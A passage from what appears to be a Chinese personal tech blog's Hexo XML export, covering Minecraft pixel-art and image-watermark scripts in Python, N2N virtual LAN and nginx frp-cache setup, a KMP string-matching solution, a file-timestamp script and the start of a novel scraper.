light_blue 淡蓝色</span></span><br><span class="line">    ((<span class="number">254</span>, <span class="number">216</span>, <span class="number">61</span>), <span class="string">&quot;4&quot;</span>),  <span class="comment"># yellow 黄色</span></span><br><span class="line">    ((<span class="number">128</span>, <span class="number">199</span>, <span class="number">31</span>), <span class="string">&quot;5&quot;</span>),  <span class="comment"># lime 黄绿色</span></span><br><span class="line">    ((<span class="number">243</span>, <span class="number">139</span>, <span class="number">170</span>), <span class="string">&quot;6&quot;</span>),  <span class="comment"># pink 粉红色</span></span><br><span class="line">    ((<span class="number">71</span>, <span class="number">79</span>, <span class="number">82</span>), <span class="string">&quot;7&quot;</span>),  <span class="comment"># gray 灰色</span></span><br><span class="line">    ((<span class="number">157</span>, <span class="number">157</span>, <span class="number">151</span>), <span class="string">&quot;8&quot;</span>),  <span class="comment"># light_gray 淡灰色</span></span><br><span class="line">    ((<span class="number">22</span>, <span class="number">156</span>, <span class="number">156</span>), <span class="string">&quot;9&quot;</span>),  <span class="comment"># cyan 青色</span></span><br><span class="line">    ((<span class="number">137</span>, <span class="number">50</span>, <span class="number">184</span>), <span class="string">&quot;10&quot;</span>),  <span class="comment"># purple 紫色</span></span><br><span class="line">    ((<span class="number">60</span>, <span class="number">68</span>, <span class="number">170</span>), <span class="string">&quot;11&quot;</span>),  <span class="comment"># blue 蓝色</span></span><br><span class="line">    ((<span class="number">131</span>, <span class="number">84</span>, <span class="number">50</span>), <span class="string">&quot;12&quot;</span>),  <span class="comment"># brown 棕色</span></span><br><span class="line">    ((<span class="number">94</span>, <span class="number">124</span>, <span class="number">22</span>), <span class="string">&quot;13&quot;</span>),  <span class="comment"># green 绿色</span></span><br><span class="line">    ((<span class="number">176</span>, <span class="number">46</span>, <span class="number">38</span>), <span class="string">&quot;14&quot;</span>),  <span class="comment"># red 红色</span></span><br><span class="line">    ((<span class="number">29</span>, <span class="number">29</span>, <span class="number">33</span>), <span class="string">&quot;15&quot;</span>),  <span class="comment"># black 黑色</span></span><br><span class="line">    ((<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="string">&quot;15&quot;</span>),  <span class="comment"># black 黑色</span></span><br><span class="line"></span><br><span class="line">))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_hsv</span>(<span class="params">color</span>):</span></span><br><span class="line">    <span class="keyword">return</span> rgb_to_hsv(*[x / <span class="number">255.0</span> <span class="keyword">for</span> x <span class="keyword">in</span> color])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">color_dist</span>(<span class="params">c1, c2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sum((a - b) ** <span class="number">2</span> <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(to_hsv(c1), to_hsv(c2)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">min_color_diff</span>(<span class="params">color_to_match, colors</span>):</span></span><br><span class="line">    <span class="keyword">return</span> min((color_dist(color_to_match, test), colors[test]) <span class="keyword">for</span> test <span class="keyword">in</span> colors)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 此函数暂时无用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_player_direction</span>(<span class="params">rotation</span>):</span></span><br><span class="line">    rec = [<span class="number">-90</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">180</span>]  <span class="comment"># +x, +z, -x, -z</span></span><br><span class="line">    <span class="keyword">if</span> abs(rotation) &lt; <span class="number">45</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;+z&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> abs(rotation) &gt; <span class="number">145</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-z&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> rotation &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;+x&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-x&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mc = minecraft.Minecraft.create()</span><br><span class="line">im = Image.open(<span class="string">&#x27;6.jpg&#x27;</span>)</span><br><span class="line">im = im.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">list = numpy.array(im)</span><br><span class="line">size = list.shape</span><br><span class="line">start = mc.player.getTilePos()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(size[<span class="number">0</span>]):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(size[<span class="number">1</span>]):</span><br><span class="line">        item = min_color_diff(list[i][j], colors)</span><br><span class="line">        mc.setBlock(start.x + size[<span class="number">0</span>] - i, start.y, start.z + j, <span class="number">251</span>, int(item[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
<p><font color="red">效果如下:</font><br><img data-src="https://cdn.file.todest.cn/pic/2019093001.png" alt="皮卡丘"><br><img data-src="https://cdn.file.todest.cn/pic/2019093002.png" alt="晚安"></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Minecraft</tag>
      </tags>
  </entry>
  <entry>
    <title>N2N构建虚拟局域网</title>
    <url>/post/81bd05cb/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>N2N是一款开源的P2P软件，可以用来构建虚拟局域网，也就是说，每个N2N虚拟网络內的用户都可以通过N2N网络访问其他用户主机，即相互ping通。</p>
<h1 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h1><p><strong>Supernode 超级节点：</strong>它在Edge节点间建立握手，或为Edge节点中转数据。能够直通的节点间通讯是P2P的，则由超级节点注册网络路径，超级节点一旦帮助双方完成首次握手，剩余的数据流就会在两个Edge节点间传送，而无需超级节点介入。如果有一方Edge节点的NAT属于对称型（symmetrical），超级节点还需继续为双方提供数据转发服务。<br><strong>Edge 节点：</strong>用户主机上用以与建立N2N网络的软件。几乎每个Edge节点都需建立一个tun/tap虚拟网卡设备，作为接入N2N网络的入口。<br><a id="more"></a></p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><strong>地址</strong></p>
<ul>
<li>v1: <a href="https://github.com/meyerd/n2n/tree/master/n2n_v1">https://github.com/meyerd/n2n/tree/master/n2n_v1</a></li>
<li>v2: <a href="https://github.com/ntop/n2n">https://github.com/ntop/n2n</a></li>
<li>v2.1(v2s): <a href="https://github.com/meyerd/n2n/tree/master/n2n_v2">https://github.com/meyerd/n2n/tree/master/n2n_v2</a> 非官方版本，与官方的 v2 不兼容</li>
<li>安卓版本: <a href="https://github.com/switch-iot/hin2n">https://github.com/switch-iot/hin2n</a> (最新版本支持v1、v2、v2s)</li>
<li>网友编译的主程序：<a href="https://github.com/lucktu/n2n">https://github.com/lucktu/n2n</a></li>
</ul>
<p>由于v2s版本直连概率比较高，所以本文只介绍v2s版本。同时服务端使用 ubuntu，客户端使用 windows。</p>
<p><strong>安装方法</strong><br>先从服务端开始，在ubuntu上从github下载源码进行编译安装，由此获得两个可执行文件，supernode和edge。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/meyerd/n2n</span><br><span class="line"><span class="built_in">cd</span> n2n/n2n_v2</span><br><span class="line">mkdir build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><br>然后服务端运行supernode，服务端防火墙记得开放UDP监听端口，这里假设UDP监听端口为1234。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">supernode -l 1234</span><br></pre></td></tr></table></figure><br>接下来创建DHCP服务器。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install isc-dhcp-server</span><br><span class="line">```bash</span><br><span class="line"></span><br><span class="line">配置 `/etc/dhcp/dhcpd.conf`，写入以下内容，也可以找到相应位置，取消注释，然后修改内容.</span><br><span class="line">```bash</span><br><span class="line">ddns-update-style interim;</span><br><span class="line">ignore client-updates;</span><br><span class="line">default-lease-time 604800;</span><br><span class="line">max-lease-time 1209600;</span><br><span class="line"></span><br><span class="line">subnet 10.0.0.0 netmask 255.255.255.0 &#123;</span><br><span class="line">    option subnet-mask 255.255.255.0;</span><br><span class="line">    range dynamic-bootp 10.0.0.10 10.0.0.100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>编辑<code>/etc/default/isc-dhcp-server</code>，添加一行。假设虚拟网卡名为tun0。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">INTERFACES=<span class="string">&quot;tun0&quot;</span></span><br></pre></td></tr></table></figure><br>然后启动DHCP服务，可以使用<code>dhclient tun0</code>测试是否从DHCP服务器获取到IP。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service isc-dhcp-server start</span><br></pre></td></tr></table></figure><br>接下来配置服务端Edge节点，创建DHCP服务器用得着，否则也可以不用配置。<br>假设设定的n2n网络IP为10.0.0.1，如果需要可以加上<code>-k 自定义加密key值</code>。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">edge -d tun0 -a 10.0.0.1 -l 127.0.0.1:1234</span><br></pre></td></tr></table></figure><br>上面步骤会创建名为tun0的虚拟网卡，如果创建失败，可以按照下面方法手动创建。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install uml-utilities</span><br><span class="line">tunctl -t tun0</span><br></pre></td></tr></table></figure><br>这样，其他Edge节点启动后就可以由10.0.0.1分配IP地址。<br>windows客户端直接下载编译好的EXE文件，或是自行从github仓库下载源码编译。<br>同时，windows需先安装tap-window虚拟网卡软件。<br>然后在命令行（管理员模式）运行，注意中文路径及特殊符号路径。<br>以下为DHCP获取IP地址的指令。（不知道为什么，我每次DHCP启动或关闭都会断网一瞬间）<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">edge -r -a dhcp:10.0.0.1 -l 服务端IP:1234</span><br></pre></td></tr></table></figure><br>以下为以指定IP（10.0.0.2）启动，各个Edge节点指定IP启动的IP需各不相同。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">edge -a 10.0.0.2 -l 服务端IP:1234</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>虚拟局域网</tag>
        <tag>N2N</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx反向代理frp缓存加速</title>
    <url>/post/37646cf8/</url>
    <content><![CDATA[<p>使用nginx的反向代理缓存，将frp用户的http和https静态资源缓存到服务器本地，从而减少frp网络资源请求，直接加速静态资源访问。</p>
<blockquote>
<p>新建缓存目录</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -pv /home/nginx/cache</span><br><span class="line">chmod -R 777 /home/nginx/cache</span><br></pre></td></tr></table></figure>
<blockquote>
<p>修改 nginx.conf</p>
</blockquote>
<p>在 http{} 里添加<br><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxy_cache_path</span> /home/nginx/cache levels=<span class="number">1</span>:<span class="number">2</span> keys_zone=frp_cache:<span class="number">50m</span> max_size=<span class="number">5g</span> inactive=<span class="number">3d</span>;</span><br></pre></td></tr></table></figure><br>在 server{} 里添加<br><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:8080;</span><br><span class="line">    <span class="attribute">proxy_redirect</span> http://<span class="variable">$host</span>/ http://<span class="variable">$http_host</span>/;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~* \.(jpg|jpeg|gif|png|svg|css|scss|js|ico|xml|woff|woff2|ttf|otf|eot)$</span> &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:8080;</span><br><span class="line">    <span class="attribute">proxy_redirect</span> http://<span class="variable">$host</span>/ http://<span class="variable">$http_host</span>/;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_cache</span> frp_cache;</span><br><span class="line">    <span class="attribute">proxy_cache_key</span> <span class="variable">$uri</span><span class="variable">$is_args</span><span class="variable">$args</span>;</span><br><span class="line">    <span class="attribute">proxy_cache_valid</span> <span class="number">200</span> <span class="number">206</span> <span class="number">301</span> <span class="number">302</span> <span class="number">304</span> <span class="number">3d</span>;</span><br><span class="line">    <span class="attribute">expires</span> <span class="number">3d</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>frp</tag>
      </tags>
  </entry>
  <entry>
    <title>Python叠加图片水印</title>
    <url>/post/902d70b2/</url>
    <content><![CDATA[<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageFont, ImageDraw</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">img, factor=<span class="number">1</span></span>):</span></span><br><span class="line">    img = img.convert(<span class="string">&#x27;RGBA&#x27;</span>)</span><br><span class="line">    img_blender = Image.new(<span class="string">&#x27;RGBA&#x27;</span>, img.size, (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    img = Image.blend(img_blender, img, factor)</span><br><span class="line">    img = img.resize((<span class="number">700</span>, <span class="number">700</span>))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rootdir = <span class="string">&#x27;logo&#x27;</span></span><br><span class="line">savedir = <span class="string">&#x27;save&#x27;</span></span><br><span class="line">lists = os.listdir(rootdir)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(lists)):</span><br><span class="line">    path = os.path.join(rootdir, lists[i])</span><br><span class="line">    im = Image.open(<span class="string">&#x27;logo.jpg&#x27;</span>)</span><br><span class="line">    im1 = Image.open(path)</span><br><span class="line">    im1 = fun(im1)</span><br><span class="line">    xy = im1.size</span><br><span class="line">    im.paste(im1, (<span class="number">960</span>-xy[<span class="number">0</span>]/<span class="number">2</span>, <span class="number">400</span>-xy[<span class="number">1</span>]/<span class="number">2</span>), mask=im1)</span><br><span class="line">    draw = ImageDraw.Draw(im)</span><br><span class="line">    textsize = <span class="number">24</span></span><br><span class="line">    font = ImageFont.truetype(<span class="string">&quot;C:\Windows\Fonts\Arial.ttf&quot;</span>, textsize)</span><br><span class="line">    length = draw.textsize(lists[i].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>], font)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        font = ImageFont.truetype(<span class="string">&quot;C:\Windows\Fonts\Arial.ttf&quot;</span>, textsize)</span><br><span class="line">        length = draw.textsize(lists[i].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>], font)</span><br><span class="line">        <span class="keyword">if</span> (length[<span class="number">0</span>] &lt;= <span class="number">1536</span>) <span class="keyword">and</span> (textsize &lt;= <span class="number">96</span>):</span><br><span class="line">            textsize += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            textsize -= <span class="number">1</span></span><br><span class="line">            font = ImageFont.truetype(<span class="string">&quot;C:\Windows\Fonts\Arial.ttf&quot;</span>, textsize)</span><br><span class="line">            length = draw.textsize(lists[i].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>], font)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    draw.text((<span class="number">960</span>-length[<span class="number">0</span>]/<span class="number">2</span>, <span class="number">860</span>-length[<span class="number">1</span>]/<span class="number">2</span>), lists[i].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>], (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), font=font)</span><br><span class="line">    im.save(os.path.join(savedir, lists[i]), <span class="string">&#x27;jpeg&#x27;</span>)</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>PIL</tag>
      </tags>
  </entry>
  <entry>
    <title>Oulipo</title>
    <url>/post/ba3acb8e/</url>
    <content><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><blockquote><p>The French author Georges Perec (1936–1982) once wrote a book, La disparition, without the letter ‘e’. He was a member of the Oulipo group. A quote from the book:</p>
<p>Tout avait Pair normal, mais tout s’affirmait faux. Tout avait Fair normal, d’abord, puis surgissait l’inhumain, l’affolant. Il aurait voulu savoir où s’articulait l’association qui l’unissait au roman : stir son tapis, assaillant à tout instant son imagination, l’intuition d’un tabou, la vision d’un mal obscur, d’un quoi vacant, d’un non-dit : la vision, l’avision d’un oubli commandant tout, où s’abolissait la raison : tout avait l’air normal mais…</p>
<p>Perec would probably have scored high (or rather, low) in the following contest. People are asked to write a perhaps even meaningful text on some subject with as few occurrences of a given “word” as possible. Our task is to provide the jury with a program that counts these occurrences, in order to obtain a ranking of the competitors. These competitors often write very long texts with nonsense meaning; a sequence of 500,000 consecutive ‘T’s is not unusual. And they never use spaces.</p>
<p>So we want to quickly find out how often a word, i.e., a given string, occurs in a text. More formally: given the alphabet {‘A’, ‘B’, ‘C’, …, ‘Z’} and two finite strings over that alphabet, a word W and a text T, count the number of occurrences of W in T. All the consecutive characters of W must exactly match consecutive characters of T. Occurrences may overlap.</p>
</blockquote>
<a id="more"></a>
<h1 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h1><blockquote><p>The first line of the input file contains a single number: the number of test cases to follow. Each test case has the following format:</p>
<p>One line with the word W, a string over {‘A’, ‘B’, ‘C’, …, ‘Z’}, with 1 ≤ |W| ≤ 10,000 (here |W| denotes the length of the string W).<br>One line with the text T, a string over {‘A’, ‘B’, ‘C’, …, ‘Z’}, with |W| ≤ |T| ≤ 1,000,000.</p>
</blockquote>
<h1 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h1><blockquote><p>For every test case in the input file, the output should contain a single number, on a single line: the number of occurrences of the word W in the text T.</p>
</blockquote>
<h1 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">BAPC</span><br><span class="line">BAPC</span><br><span class="line">AZA</span><br><span class="line">AZAZAZA</span><br><span class="line">VERDI</span><br><span class="line">AVERDXIVYERDIAN</span><br></pre></td></tr></table></figure>
<h1 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> a,b;</span><br><span class="line"><span class="keyword">int</span> NEXT[<span class="number">10020</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">-1</span>;</span><br><span class="line">    NEXT[i]=j;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;b.length())&#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">-1</span>||b[i]==b[j])&#123;</span><br><span class="line">            i++;j++;</span><br><span class="line">            NEXT[i]=j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> j=NEXT[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kmp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    get();</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;a.length())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">-1</span>||a[i]==b[j])</span><br><span class="line">        &#123;</span><br><span class="line">            i++;j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> j=NEXT[j];</span><br><span class="line">        <span class="keyword">if</span>(j==b.length())</span><br><span class="line">        &#123;</span><br><span class="line">            ans++;</span><br><span class="line">            j=NEXT[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;b&gt;&gt;a;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;kmp()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>KMP</tag>
      </tags>
  </entry>
  <entry>
    <title>Python修改文件时间</title>
    <url>/post/56e638c7/</url>
    <content><![CDATA[<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> win32file <span class="keyword">import</span> CreateFile, SetFileTime, GetFileTime, CloseHandle</span><br><span class="line"><span class="keyword">from</span> win32file <span class="keyword">import</span> GENERIC_READ, GENERIC_WRITE, OPEN_EXISTING</span><br><span class="line"><span class="keyword">from</span> pywintypes <span class="keyword">import</span> Time	<span class="comment">#忽略此处报错，不影响运行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modifyFileTime</span>(<span class="params">filePath, createTime, modifyTime, accessTime, offset</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    用来修改任意文件的相关时间属性，时间格式：YYYY-MM-DD HH:MM:SS 例如：2019-02-02 00:01:02</span></span><br><span class="line"><span class="string">    :param filePath: 文件路径名</span></span><br><span class="line"><span class="string">    :param createTime: 创建时间</span></span><br><span class="line"><span class="string">    :param modifyTime: 修改时间</span></span><br><span class="line"><span class="string">    :param accessTime: 访问时间</span></span><br><span class="line"><span class="string">    :param offset: 时间偏移的秒数,tuple格式，顺序和参数时间对应</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    format = <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>  <span class="comment"># 时间格式</span></span><br><span class="line">    cTime_t = timeOffsetAndStruct(createTime, format, offset[<span class="number">0</span>])</span><br><span class="line">    mTime_t = timeOffsetAndStruct(modifyTime, format, offset[<span class="number">1</span>])</span><br><span class="line">    aTime_t = timeOffsetAndStruct(accessTime, format, offset[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    fh = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">None</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    createTimes, accessTimes, modifyTimes = GetFileTime(fh)</span><br><span class="line"></span><br><span class="line">    createTimes = Time(time.mktime(cTime_t))</span><br><span class="line">    accessTimes = Time(time.mktime(aTime_t))</span><br><span class="line">    modifyTimes = Time(time.mktime(mTime_t))</span><br><span class="line">    SetFileTime(fh, createTimes, accessTimes, modifyTimes)</span><br><span class="line">    CloseHandle(fh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeOffsetAndStruct</span>(<span class="params">times, format, offset</span>):</span></span><br><span class="line">    <span class="keyword">return</span> time.localtime(time.mktime(time.strptime(times, format)) + offset)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = (<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(<span class="string">&#x27;F:\\Blog\\source\\_posts&#x27;</span>):</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        filepath = root + <span class="string">&#x27;\\&#x27;</span> + file</span><br><span class="line">		<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		用来获取任意文件的相关时间属性</span></span><br><span class="line"><span class="string">		&quot;&quot;&quot;</span></span><br><span class="line">        ctime = str(datetime.fromtimestamp(os.path.getctime(filepath)))[:<span class="number">19</span>]</span><br><span class="line">        mtime = str(datetime.fromtimestamp(os.path.getmtime(filepath)))[:<span class="number">19</span>]</span><br><span class="line">        atime = str(datetime.fromtimestamp(os.path.getatime(filepath)))[:<span class="number">19</span>]</span><br><span class="line">        </span><br><span class="line">		modifyFileTime(filepath, ctime, mtime, atime, offset)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python多线程爬取小说</title>
    <url>/post/fa40ec29/</url>
    <content><![CDATA[<p>* 爬取网站已转移</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># Host = &#x27;https://www.biquke.com/bq/37/37868/&#x27;</span></span><br><span class="line">Host = <span class="string">&#x27;https://www.biquke.com/bq/75/75429/&#x27;</span></span><br><span class="line"></span><br><span class="line">header = [</span><br><span class="line">    &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 &#x27;</span></span><br><span class="line">                   <span class="string">&#x27;(KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 &#x27;</span></span><br><span class="line">                   <span class="string">&#x27;(KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)&#x27;</span>&#125;</span><br><span class="line">]</span><br><span class="line">name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geturl</span>(<span class="params">url, page</span>):</span></span><br><span class="line">    repeat = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = requests.get(Host + url, headers=header[random.randint(<span class="number">0</span>, <span 